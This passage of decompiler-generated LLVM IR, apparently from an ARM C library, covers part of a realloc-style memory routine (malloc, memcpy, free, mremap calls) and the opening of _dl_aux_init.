  %v1_fc44 = load i32, i32* %r0.global-to-local, align 4
  %v2_fc44 = add i32 %v1_fc44, 44
  %v3_fc44 = inttoptr i32 %v2_fc44 to i32*
  store i32 %v0_fc44, i32* %v3_fc44, align 4
  %v0_fc48 = load i32, i32* %r3.global-to-local, align 4
  %v1_fc48 = load i32, i32* %r1.global-to-local, align 4
  %v2_fc48 = add i32 %v1_fc48, 4
  %v3_fc48 = inttoptr i32 %v2_fc48 to i32*
  store i32 %v0_fc48, i32* %v3_fc48, align 4
  br label %dec_label_pc_fe8c

dec_label_pc_fc50:                                ; preds = %dec_label_pc_fbf4
  %v1_fc50 = and i32 %v3_fc0c, -2
  %v2_fc54 = add i32 %v1_fc50, %v2_fc04
  store i32 %v2_fc54, i32* %r3.global-to-local, align 4
  %v1_fc58 = add i32 %v2_fc54, 4
  %v2_fc58 = inttoptr i32 %v1_fc58 to i32*
  %v3_fc58 = load i32, i32* %v2_fc58, align 4
  store i32 %v3_fc58, i32* %r3.global-to-local, align 4
  %v1_fc5c = urem i32 %v3_fc58, 2
  %v2_fc5c = icmp eq i32 %v1_fc5c, 0
  br i1 %v2_fc5c, label %dec_label_pc_fc64, label %dec_label_pc_fca4

dec_label_pc_fc64:                                ; preds = %dec_label_pc_fc50
  %v1_fc64 = and i32 %v3_fc0c, -4
  store i32 %v1_fc64, i32* %r3.global-to-local, align 4
  %v2_fc68 = add i32 %v1_fc64, %v1_fbe0
  store i32 %v2_fc68, i32* %r0.global-to-local, align 4
  %v3_fc6c = icmp ult i32 %v2_fc68, %v1_fbe8
  br i1 %v3_fc6c, label %dec_label_pc_fca4, label %dec_label_pc_fc74

dec_label_pc_fc74:                                ; preds = %dec_label_pc_fc64
  %v1_fc74 = add i32 %v1_fbe0, %v0_fbc8
  %v2_fc74 = inttoptr i32 %v1_fc74 to i32*
  %v3_fc74 = load i32, i32* %v2_fc74, align 4
  store i32 %v3_fc74, i32* %r1.global-to-local, align 4
  %v1_fc78 = add i32 %v3_fc74, 12
  %v2_fc78 = inttoptr i32 %v1_fc78 to i32*
  %v3_fc78 = load i32, i32* %v2_fc78, align 4
  store i32 %v3_fc78, i32* %r3.global-to-local, align 4
  %v9_fc7c = icmp eq i32 %v3_fc78, %v2_fc04
  %v1_fc80 = add i32 %v2_fc04, 12
  %v2_fc80 = inttoptr i32 %v1_fc80 to i32*
  %v3_fc80 = load i32, i32* %v2_fc80, align 4
  store i32 %v3_fc80, i32* %r2.global-to-local, align 4
  br i1 %v9_fc7c, label %dec_label_pc_fc88, label %dec_label_pc_fc94

dec_label_pc_fc88:                                ; preds = %dec_label_pc_fc74
  %v1_fc88 = add i32 %v3_fc80, 8
  %v2_fc88 = inttoptr i32 %v1_fc88 to i32*
  %v3_fc88 = load i32, i32* %v2_fc88, align 4
  store i32 %v3_fc88, i32* %r3.global-to-local, align 4
  %v9_fc8c = icmp eq i32 %v3_fc88, %v2_fc04
  br i1 %v9_fc8c, label %dec_label_pc_fc98, label %dec_label_pc_fc94

dec_label_pc_fc94:                                ; preds = %dec_label_pc_fc74, %dec_label_pc_fc88
  %v0_fc94 = call i32 @abort()
  store i32 %v0_fc94, i32* %r0.global-to-local, align 4
  %v0_fc98.pre = load i32, i32* @r1, align 4
  %v1_fc98.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_fc98

dec_label_pc_fc98:                                ; preds = %dec_label_pc_fc88, %dec_label_pc_fc94
  %v1_fc98 = phi i32 [ %v3_fc80, %dec_label_pc_fc88 ], [ %v1_fc98.pre, %dec_label_pc_fc94 ]
  %v0_fc98 = phi i32 [ %v3_fc74, %dec_label_pc_fc88 ], [ %v0_fc98.pre, %dec_label_pc_fc94 ]
  %v2_fc98 = add i32 %v1_fc98, 8
  %v3_fc98 = inttoptr i32 %v2_fc98 to i32*
  store i32 %v0_fc98, i32* %v3_fc98, align 4
  %v0_fc9c = load i32, i32* %r2.global-to-local, align 4
  %v1_fc9c = load i32, i32* %r1.global-to-local, align 4
  %v2_fc9c = add i32 %v1_fc9c, 12
  %v3_fc9c = inttoptr i32 %v2_fc9c to i32*
  store i32 %v0_fc9c, i32* %v3_fc9c, align 4
  %v1_fd58.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fd58

dec_label_pc_fca4:                                ; preds = %dec_label_pc_fc14, %dec_label_pc_fc64, %dec_label_pc_fc50
  %v1_fca4 = add i32 %v1_fbe8, -7
  store i32 %v1_fca4, i32* %r0.global-to-local, align 4
  %v1_fca8 = call i32 @malloc(i32 %v1_fca4)
  store i32 %v1_fca8, i32* @r0, align 4
  store i32 %v1_fca8, i32* %r1.global-to-local, align 4
  %v2_fcac = icmp eq i32 %v1_fca8, 0
  br i1 %v2_fcac, label %bb31, label %dec_label_pc_fcb8

bb31:                                             ; preds = %dec_label_pc_fca4
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_fe8c

dec_label_pc_fcb8:                                ; preds = %dec_label_pc_fca4
  %v1_fcc0.pre = load i32, i32* @r4, align 4
  %v1_fcb8 = add i32 %v1_fca8, -4
  %v2_fcb8 = inttoptr i32 %v1_fcb8 to i32*
  %v3_fcb8 = load i32, i32* %v2_fcb8, align 4
  store i32 %v3_fcb8, i32* @r3, align 4
  %v1_fcbc = add i32 %v1_fca8, -8
  store i32 %v1_fcbc, i32* @r7, align 4
  %v9_fcc0 = icmp eq i32 %v1_fcbc, %v1_fcc0.pre
  br i1 %v9_fcc0, label %.thread2, label %dec_label_pc_fcd0

.thread2:                                         ; preds = %dec_label_pc_fcb8
  %v2_fcc4 = and i32 %v3_fcb8, -4
  store i32 %v2_fcc4, i32* %r3.global-to-local, align 4
  %v2_fcc8 = load i32, i32* @r6, align 4
  %v3_fcc8 = add i32 %v2_fcc8, %v2_fcc4
  store i32 %v3_fcc8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fd58

dec_label_pc_fcd0:                                ; preds = %dec_label_pc_fcb8
  %v0_fcd0 = load i32, i32* @r6, align 4
  %v1_fcd0 = add i32 %v0_fcd0, -4
  store i32 %v1_fcd0, i32* @r2, align 4
  %v3_fcd4 = udiv i32 %v1_fcd0, 4
  store i32 %v3_fcd4, i32* @ip, align 4
  %tmp37 = and i32 %v1_fcd0, -4
  %tmp38 = icmp eq i32 %tmp37, 36
  %v2_fcdc = icmp ult i32 %v1_fcd0, 36
  %v3_fcdc = or i1 %tmp38, %v2_fcdc
  %v0_fcec = load i32, i32* @r5, align 4
  br i1 %v3_fcdc, label %dec_label_pc_fcec, label %dec_label_pc_fce0

dec_label_pc_fce0:                                ; preds = %dec_label_pc_fcd0
  store i32 %v0_fcec, i32* @r1, align 4
  %v0_fce4 = call i32 @memcpy()
  store i32 %v0_fce4, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_fcec:                                ; preds = %dec_label_pc_fcd0
  %v1_fcec = inttoptr i32 %v0_fcec to i32*
  %v2_fcec = load i32, i32* %v1_fcec, align 4
  store i32 %v2_fcec, i32* %r3.global-to-local, align 4
  %v2_fcf0 = inttoptr i32 %v1_fca8 to i32*
  store i32 %v2_fcec, i32* %v2_fcf0, align 4
  %v0_fcf4 = load i32, i32* @r5, align 4
  %v1_fcf4 = add i32 %v0_fcf4, 4
  %v2_fcf4 = inttoptr i32 %v1_fcf4 to i32*
  %v3_fcf4 = load i32, i32* %v2_fcf4, align 4
  store i32 %v3_fcf4, i32* %r3.global-to-local, align 4
  %v1_fcf8 = load i32, i32* %r1.global-to-local, align 4
  %v2_fcf8 = add i32 %v1_fcf8, 4
  %v3_fcf8 = inttoptr i32 %v2_fcf8 to i32*
  store i32 %v3_fcf4, i32* %v3_fcf8, align 4
  %v0_fcfc = load i32, i32* @r5, align 4
  %v1_fcfc = add i32 %v0_fcfc, 8
  %v2_fcfc = inttoptr i32 %v1_fcfc to i32*
  %v3_fcfc = load i32, i32* %v2_fcfc, align 4
  store i32 %v3_fcfc, i32* %r3.global-to-local, align 4
  %v0_fd00 = load i32, i32* @ip, align 4
  %v1_fd04 = load i32, i32* %r1.global-to-local, align 4
  %v2_fd04 = add i32 %v1_fd04, 8
  %v3_fd04 = inttoptr i32 %v2_fd04 to i32*
  store i32 %v3_fcfc, i32* %v3_fd04, align 4
  %tmp39 = icmp ult i32 %v0_fd00, 5
  br i1 %tmp39, label %.thread6, label %dec_label_pc_fd0c

dec_label_pc_fd0c:                                ; preds = %dec_label_pc_fcec
  %v0_fd0c = load i32, i32* @r5, align 4
  %v1_fd0c = add i32 %v0_fd0c, 12
  %v2_fd0c = inttoptr i32 %v1_fd0c to i32*
  %v3_fd0c = load i32, i32* %v2_fd0c, align 4
  store i32 %v3_fd0c, i32* %r3.global-to-local, align 4
  %v1_fd10 = load i32, i32* %r1.global-to-local, align 4
  %v2_fd10 = add i32 %v1_fd10, 12
  %v3_fd10 = inttoptr i32 %v2_fd10 to i32*
  store i32 %v3_fd0c, i32* %v3_fd10, align 4
  %v0_fd14 = load i32, i32* @r5, align 4
  %v1_fd14 = add i32 %v0_fd14, 16
  %v2_fd14 = inttoptr i32 %v1_fd14 to i32*
  %v3_fd14 = load i32, i32* %v2_fd14, align 4
  store i32 %v3_fd14, i32* %r3.global-to-local, align 4
  %v0_fd18 = load i32, i32* @ip, align 4
  %v1_fd1c = load i32, i32* %r1.global-to-local, align 4
  %v2_fd1c = add i32 %v1_fd1c, 16
  %v3_fd1c = inttoptr i32 %v2_fd1c to i32*
  store i32 %v3_fd14, i32* %v3_fd1c, align 4
  %tmp40 = icmp ult i32 %v0_fd18, 7
  br i1 %tmp40, label %.thread6, label %dec_label_pc_fd24

dec_label_pc_fd24:                                ; preds = %dec_label_pc_fd0c
  %v0_fd24 = load i32, i32* @r5, align 4
  %v1_fd24 = add i32 %v0_fd24, 20
  %v2_fd24 = inttoptr i32 %v1_fd24 to i32*
  %v3_fd24 = load i32, i32* %v2_fd24, align 4
  store i32 %v3_fd24, i32* %r3.global-to-local, align 4
  %v1_fd28 = load i32, i32* %r1.global-to-local, align 4
  %v2_fd28 = add i32 %v1_fd28, 20
  %v3_fd28 = inttoptr i32 %v2_fd28 to i32*
  store i32 %v3_fd24, i32* %v3_fd28, align 4
  %v0_fd2c = load i32, i32* @r5, align 4
  %v1_fd2c = add i32 %v0_fd2c, 24
  %v2_fd2c = inttoptr i32 %v1_fd2c to i32*
  %v3_fd2c = load i32, i32* %v2_fd2c, align 4
  store i32 %v3_fd2c, i32* %r3.global-to-local, align 4
  %v1_fd30 = load i32, i32* %r1.global-to-local, align 4
  %v2_fd30 = add i32 %v1_fd30, 24
  %v3_fd30 = inttoptr i32 %v2_fd30 to i32*
  store i32 %v3_fd2c, i32* %v3_fd30, align 4
  %v0_fd34 = load i32, i32* @ip, align 4
  %v7_fd34 = icmp eq i32 %v0_fd34, 9
  br i1 %v7_fd34, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_fd24
  %v1_fd38 = load i32, i32* @r5, align 4
  %v2_fd38 = add i32 %v1_fd38, 28
  %v3_fd38 = inttoptr i32 %v2_fd38 to i32*
  %v4_fd38 = load i32, i32* %v3_fd38, align 4
  store i32 %v4_fd38, i32* %r3.global-to-local, align 4
  %v2_fd3c = load i32, i32* %r1.global-to-local, align 4
  %v3_fd3c = add i32 %v2_fd3c, 28
  %v4_fd3c = inttoptr i32 %v3_fd3c to i32*
  store i32 %v4_fd38, i32* %v4_fd3c, align 4
  %v1_fd40 = load i32, i32* @r5, align 4
  %v2_fd40 = add i32 %v1_fd40, 32
  %v3_fd40 = inttoptr i32 %v2_fd40 to i32*
  %v4_fd40 = load i32, i32* %v3_fd40, align 4
  store i32 %v4_fd40, i32* %r3.global-to-local, align 4
  %v2_fd44 = load i32, i32* %r1.global-to-local, align 4
  %v3_fd44 = add i32 %v2_fd44, 32
  %v4_fd44 = inttoptr i32 %v3_fd44 to i32*
  store i32 %v4_fd40, i32* %v4_fd44, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_fd24, %dec_label_pc_fd0c, %dec_label_pc_fcec, %dec_label_pc_fce0, %bb32
  %v0_fd48 = load i32, i32* @r5, align 4
  store i32 %v0_fd48, i32* @r0, align 4
  %v0_fd4c = call i32 @free()
  store i32 %v0_fd4c, i32* %r0.global-to-local, align 4
  %v0_fd50 = load i32, i32* @r7, align 4
  %v1_fd50 = add i32 %v0_fd50, 8
  store i32 %v1_fd50, i32* @r4, align 4
  br label %dec_label_pc_fe8c

dec_label_pc_fd58:                                ; preds = %bb30, %.thread2, %dec_label_pc_fc98
  %v0_fd6c = phi i32 [ %v3_fcc8, %.thread2 ], [ %v1_fbe0, %bb30 ], [ %v1_fd58.pre, %dec_label_pc_fc98 ]
  %v0_fd58 = load i32, i32* @sb, align 4
  %v2_fd58 = sub i32 %v0_fd6c, %v0_fd58
  store i32 %v2_fd58, i32* %r1.global-to-local, align 4
  %v0_fd60 = load i32, i32* @sl, align 4
  %v1_fd60 = add i32 %v0_fd60, 4
  %v2_fd60 = inttoptr i32 %v1_fd60 to i32*
  %v3_fd60 = load i32, i32* %v2_fd60, align 4
  %tmp41 = icmp ugt i32 %v2_fd58, 15
  %v1_fd88 = urem i32 %v3_fd60, 2
  store i32 %v1_fd88, i32* %r3.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_fd88, label %dec_label_pc_fd68

dec_label_pc_fd68:                                ; preds = %dec_label_pc_fd58
  %v2_fd6c = or i32 %v1_fd88, %v0_fd6c
  store i32 %v2_fd6c, i32* %r3.global-to-local, align 4
  store i32 %v2_fd6c, i32* %v2_fd60, align 4
  %v0_fd74 = load i32, i32* @sl, align 4
  %v1_fd74 = load i32, i32* %r0.global-to-local, align 4
  %v2_fd74 = add i32 %v1_fd74, %v0_fd74
  store i32 %v2_fd74, i32* %r2.global-to-local, align 4
  %v1_fd78 = add i32 %v2_fd74, 4
  %v2_fd78 = inttoptr i32 %v1_fd78 to i32*
  %v3_fd78 = load i32, i32* %v2_fd78, align 4
  %v1_fd7c = or i32 %v3_fd78, 1
  store i32 %v1_fd7c, i32* %r3.global-to-local, align 4
  store i32 %v1_fd7c, i32* %v2_fd78, align 4
  br label %dec_label_pc_fdb8

dec_label_pc_fd88:                                ; preds = %dec_label_pc_fd58
  %v2_fd8c = add i32 %v0_fd60, %v0_fd58
  store i32 %v2_fd8c, i32* %r0.global-to-local, align 4
  %v2_fd90 = or i32 %v1_fd88, %v0_fd58
  store i32 %v2_fd90, i32* %r3.global-to-local, align 4
  %v1_fd94 = or i32 %v2_fd58, 1
  store i32 %v1_fd94, i32* %r2.global-to-local, align 4
  store i32 %v2_fd90, i32* %v2_fd60, align 4
  %v0_fd9c = load i32, i32* %r2.global-to-local, align 4
  %v1_fd9c = load i32, i32* %r0.global-to-local, align 4
  %v2_fd9c = add i32 %v1_fd9c, 4
  %v3_fd9c = inttoptr i32 %v2_fd9c to i32*
  store i32 %v0_fd9c, i32* %v3_fd9c, align 4
  %v0_fda0 = load i32, i32* %r0.global-to-local, align 4
  %v1_fda0 = load i32, i32* %r1.global-to-local, align 4
  %v2_fda0 = add i32 %v1_fda0, %v0_fda0
  store i32 %v2_fda0, i32* %r2.global-to-local, align 4
  %v1_fda4 = add i32 %v2_fda0, 4
  %v2_fda4 = inttoptr i32 %v1_fda4 to i32*
  %v3_fda4 = load i32, i32* %v2_fda4, align 4
  %v1_fda8 = or i32 %v3_fda4, 1
  store i32 %v1_fda8, i32* %r3.global-to-local, align 4
  store i32 %v1_fda8, i32* %v2_fda4, align 4
  %v0_fdb0 = load i32, i32* %r0.global-to-local, align 4
  %v1_fdb0 = add i32 %v0_fdb0, 8
  store i32 %v1_fdb0, i32* @r0, align 4
  %v0_fdb4 = call i32 @free()
  store i32 %v0_fdb4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fdb8

dec_label_pc_fdb8:                                ; preds = %dec_label_pc_fd68, %dec_label_pc_fd88
  %v0_fdb8 = load i32, i32* @sl, align 4
  %v1_fdb8 = add i32 %v0_fdb8, 8
  store i32 %v1_fdb8, i32* @r4, align 4
  br label %dec_label_pc_fe8c

dec_label_pc_fdc0:                                ; preds = %bb29
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* %r1.global-to-local, align 4
  %v4_fdc8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 32) to i32*), align 4
  store i32 %v4_fdc8, i32* @r8, align 4
  %v2_fdcc = inttoptr i32 %v1_fbdc to i32*
  %v3_fdcc = load i32, i32* %v2_fdcc, align 4
  store i32 %v3_fdcc, i32* @r4, align 4
  %v1_fdd0 = add i32 %v4_fdc8, 860
  %v2_fdd0 = inttoptr i32 %v1_fdd0 to i32*
  %v3_fdd0 = load i32, i32* %v2_fdd0, align 4
  %v1_fdd4 = add i32 %v3_fdcc, 4
  %v1_fdd8 = add i32 %v3_fdd0, -1
  store i32 %v1_fdd8, i32* %r2.global-to-local, align 4
  %v2_fddc = add i32 %v1_fdd4, %v1_fdd8
  %v1_fde0 = load i32, i32* @sb, align 4
  %v2_fde0 = add i32 %v2_fddc, %v1_fde0
  store i32 %v2_fde0, i32* %r3.global-to-local, align 4
  %v2_fde4 = sub i32 0, %v3_fdd0
  %v3_fde4 = and i32 %v2_fde0, %v2_fde4
  store i32 %v3_fde4, i32* @r7, align 4
  %v2_fde8 = sub i32 %v3_fde4, %v3_fdcc
  store i32 %v2_fde8, i32* @fp, align 4
  %v9_fdec = icmp eq i32 %v1_fbe0, %v2_fde8
  br i1 %v9_fdec, label %dec_label_pc_fe60, label %dec_label_pc_fdf4

dec_label_pc_fdf4:                                ; preds = %dec_label_pc_fdc0
  %v2_fdf4 = sub i32 %v1_fbdc, %v3_fdcc
  store i32 %v2_fdf4, i32* %r0.global-to-local, align 4
  %v2_fdf8 = add i32 %v3_fdcc, %v1_fbe0
  store i32 %v2_fdf8, i32* %r1.global-to-local, align 4
  store i32 %v3_fde4, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_fe04 = call i32 @mremap(i32 %v2_fdf4, i32 %v2_fdf8, i32 %v3_fde4, i32 1)
  store i32 %v4_fe04, i32* %r0.global-to-local, align 4
  %v7_fe08 = icmp eq i32 %v4_fe04, -1
  br i1 %v7_fe08, label %dec_label_pc_fe54, label %dec_label_pc_fe10

dec_label_pc_fe10:                                ; preds = %dec_label_pc_fdf4
  %v1_fe10 = load i32, i32* @r4, align 4
  %v2_fe10 = add i32 %v1_fe10, %v4_fe04
  store i32 %v2_fe10, i32* %r0.global-to-local, align 4
  %v0_fe14 = load i32, i32* @fp, align 4
  %v1_fe14 = or i32 %v0_fe14, 2
  store i32 %v1_fe14, i32* %r3.global-to-local, align 4
  %v2_fe18 = add i32 %v2_fe10, 4
  %v3_fe18 = inttoptr i32 %v2_fe18 to i32*
  store i32 %v1_fe14, i32* %v3_fe18, align 4
  %v0_fe1c = load i32, i32* @r8, align 4
  %v1_fe1c = add i32 %v0_fe1c, 868
  %v2_fe1c = inttoptr i32 %v1_fe1c to i32*
  %v3_fe1c = load i32, i32* %v2_fe1c, align 4
  store i32 %v3_fe1c, i32* %r3.global-to-local, align 4
  %v1_fe20 = add i32 %v0_fe1c, 880
  %v2_fe20 = inttoptr i32 %v1_fe20 to i32*
  %v3_fe20 = load i32, i32* %v2_fe20, align 4
  store i32 %v3_fe20, i32* %r2.global-to-local, align 4
  %v0_fe24 = load i32, i32* @r6, align 4
  %v2_fe24 = sub i32 %v3_fe1c, %v0_fe24
  store i32 %v2_fe24, i32* %r3.global-to-local, align 4
  %v1_fe28 = load i32, i32* @r7, align 4
  %v2_fe28 = add i32 %v1_fe28, %v2_fe24
  store i32 %v2_fe28, i32* %r1.global-to-local, align 4
  %v1_fe2c = add i32 %v0_fe1c, 872
  %v2_fe2c = inttoptr i32 %v1_fe2c to i32*
  %v3_fe2c = load i32, i32* %v2_fe2c, align 4
  store i32 %v3_fe2c, i32* %r3.global-to-local, align 4
  %v1_fe34 = add i32 %v0_fe1c, 884
  %v2_fe34 = inttoptr i32 %v1_fe34 to i32*
  %v3_fe34 = load i32, i32* %v2_fe34, align 4
  store i32 %v3_fe34, i32* %r2.global-to-local, align 4
  %tmp42 = icmp ugt i32 %v2_fe28, %v3_fe20
  br i1 %tmp42, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_fe10
  store i32 %v2_fe28, i32* %v2_fe20, align 4
  %v0_fe3c.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_fe3c.pre = load i32, i32* @r8, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_fe10, %bb33
  %v1_fe3c = phi i32 [ %v0_fe1c, %dec_label_pc_fe10 ], [ %v1_fe3c.pre, %bb33 ]
  %v0_fe3c = phi i32 [ %v2_fe28, %dec_label_pc_fe10 ], [ %v0_fe3c.pre, %bb33 ]
  %v2_fe3c = add i32 %v1_fe3c, 868
  %v3_fe3c = inttoptr i32 %v2_fe3c to i32*
  store i32 %v0_fe3c, i32* %v3_fe3c, align 4
  %v0_fe40 = load i32, i32* %r1.global-to-local, align 4
  %v1_fe40 = load i32, i32* %r3.global-to-local, align 4
  %v2_fe40 = add i32 %v1_fe40, %v0_fe40
  store i32 %v2_fe40, i32* %r1.global-to-local, align 4
  %v1_fe44 = load i32, i32* %r2.global-to-local, align 4
  %v0_fe48 = load i32, i32* %r0.global-to-local, align 4
  %v1_fe48 = add i32 %v0_fe48, 8
  store i32 %v1_fe48, i32* @r4, align 4
  %tmp43 = icmp ugt i32 %v2_fe40, %v1_fe44
  br i1 %tmp43, label %bb35, label %dec_label_pc_fe8c

bb35:                                             ; preds = %bb34
  %v5_fe4c = load i32, i32* @r8, align 4
  %v6_fe4c = add i32 %v5_fe4c, 884
  %v7_fe4c = inttoptr i32 %v6_fe4c to i32*
  store i32 %v2_fe40, i32* %v7_fe4c, align 4
  br label %dec_label_pc_fe8c

dec_label_pc_fe54:                                ; preds = %dec_label_pc_fdf4
  %v0_fe54 = load i32, i32* @sb, align 4
  %v1_fe54 = add i32 %v0_fe54, 4
  store i32 %v1_fe54, i32* %r3.global-to-local, align 4
  %v0_fe58 = load i32, i32* @r6, align 4
  %v3_fe58 = icmp ult i32 %v0_fe58, %v1_fe54
  br i1 %v3_fe58, label %dec_label_pc_fe68, label %dec_label_pc_fe54.dec_label_pc_fe60_crit_edge

dec_label_pc_fe54.dec_label_pc_fe60_crit_edge:    ; preds = %dec_label_pc_fe54
  %v0_fe60.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_fe60

dec_label_pc_fe60:                                ; preds = %dec_label_pc_fe54.dec_label_pc_fe60_crit_edge, %dec_label_pc_fdc0
  %v0_fe60 = phi i32 [ %v0_fe60.pre, %dec_label_pc_fe54.dec_label_pc_fe60_crit_edge ], [ %v0_fbc8, %dec_label_pc_fdc0 ]
  store i32 %v0_fe60, i32* @r4, align 4
  br label %dec_label_pc_fe8c

dec_label_pc_fe68:                                ; preds = %dec_label_pc_fe54
  %v1_fe68 = add i32 %v0_fe54, -7
  store i32 %v1_fe68, i32* %r0.global-to-local, align 4
  %v1_fe6c = call i32 @malloc(i32 %v1_fe68)
  store i32 %v1_fe6c, i32* @r0, align 4
  store i32 %v1_fe6c, i32* @r4, align 4
  %v2_fe70 = icmp eq i32 %v1_fe6c, 0
  br i1 %v2_fe70, label %dec_label_pc_fe8c, label %dec_label_pc_fe78

dec_label_pc_fe78:                                ; preds = %dec_label_pc_fe68
  %v0_fe78 = load i32, i32* @r6, align 4
  %v1_fe78 = add i32 %v0_fe78, -8
  store i32 %v1_fe78, i32* @r2, align 4
  %v0_fe7c = load i32, i32* @r5, align 4
  store i32 %v0_fe7c, i32* @r1, align 4
  %v0_fe80 = call i32 @memcpy()
  %v0_fe84 = load i32, i32* @r5, align 4
  store i32 %v0_fe84, i32* @r0, align 4
  %v0_fe88 = call i32 @free()
  store i32 %v0_fe88, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fe8c

dec_label_pc_fe8c:                                ; preds = %bb31, %bb35, %bb34, %dec_label_pc_fe68, %dec_label_pc_fe60, %dec_label_pc_fdb8, %.thread6, %dec_label_pc_fc28, %dec_label_pc_fe78
  store i32 %v2_fb7c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* %r2.global-to-local, align 4
  %v4_fe9c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 24) to i32*), align 4
  store i32 %v4_fe9c, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_fe9c)
  br label %dec_label_pc_fea8

dec_label_pc_fea8:                                ; preds = %dec_label_pc_fbb0, %dec_label_pc_fb58, %dec_label_pc_fb40, %dec_label_pc_fe8c
  %v0_fea8 = load i32, i32* @r4, align 4
  store i32 %v0_fea8, i32* %r0.global-to-local, align 4
  store i32 %v3_fb20, i32* @r4, align 4
  store i32 %v6_fb20, i32* @r5, align 4
  store i32 %v9_fb20, i32* @r6, align 4
  store i32 %v12_fb20, i32* @r7, align 4
  store i32 %v15_fb20, i32* @r8, align 4
  store i32 %v18_fb20, i32* @sb, align 4
  store i32 %v21_fb20, i32* @sl, align 4
  store i32 %v24_fb20, i32* @fp, align 4
  store i32 %v27_fb20, i32* @lr, align 4
  ret i32 %v0_fea8

; uselistorder directives
  uselistorder i32 %v2_fe40, { 1, 0, 2 }
  uselistorder i32 %v2_fe28, { 1, 2, 0, 3 }
  uselistorder i32 %v4_fe04, { 1, 0, 2 }
  uselistorder i32 %v3_fde4, { 1, 0, 2, 3 }
  uselistorder i32 %v1_fd88, { 2, 1, 0 }
  uselistorder i32 %v2_fd58, { 1, 0, 2 }
  uselistorder i32 %v0_fcec, { 1, 0 }
  uselistorder i32 %v1_fca8, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_fc0c, { 0, 2, 1, 3 }
  uselistorder i32 %v2_fc04, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_fbe8, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_fbe0, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_fbdc, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_fbcc, { 1, 0 }
  uselistorder i32 %v0_fbc8, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_fba8, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 12, 8, 9, 10, 11, 23, 13, 15, 14, 16, 22, 24, 17, 18, 19, 20, 21, 27, 26, 25, 28, 30, 29 }
  uselistorder i32 860, { 0, 2, 1, 3 }
  uselistorder i32 ()* @abort, { 5, 1, 0, 4, 3, 2, 6 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 32) to i32*), { 3, 2, 17, 7, 8, 9, 10, 11, 6, 12, 5, 13, 0, 14, 15, 4, 16, 1 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 16) to i32*), { 0, 2, 1 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 72) to i32*), { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_fea8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_fe8c, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_fdb8, { 1, 0 }
  uselistorder label %dec_label_pc_fd58, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_fca4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_fc98, { 1, 0 }
  uselistorder label %dec_label_pc_fc94, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* %r2.global-to-local, align 4
  %v4_fee0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 104) to i32*), align 4
  %v4_fee8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 68) to i32*), align 4
  store i32 %v4_fee8, i32* %r1.global-to-local, align 4
  %v1_feec = add i32 %arg1, 44
  %v2_feec = inttoptr i32 %v1_feec to i32*
  %v3_feec = load i32, i32* %v2_feec, align 4
  %v1_fef0 = add i32 %arg1, 28
  %v2_fef0 = inttoptr i32 %v1_fef0 to i32*
  %v3_fef0 = load i32, i32* %v2_fef0, align 4
  store i32 %v3_fef0, i32* %r2.global-to-local, align 4
  %v2_fef4 = inttoptr i32 %v4_fee0 to i32*
  store i32 %v3_feec, i32* %v2_fef4, align 4
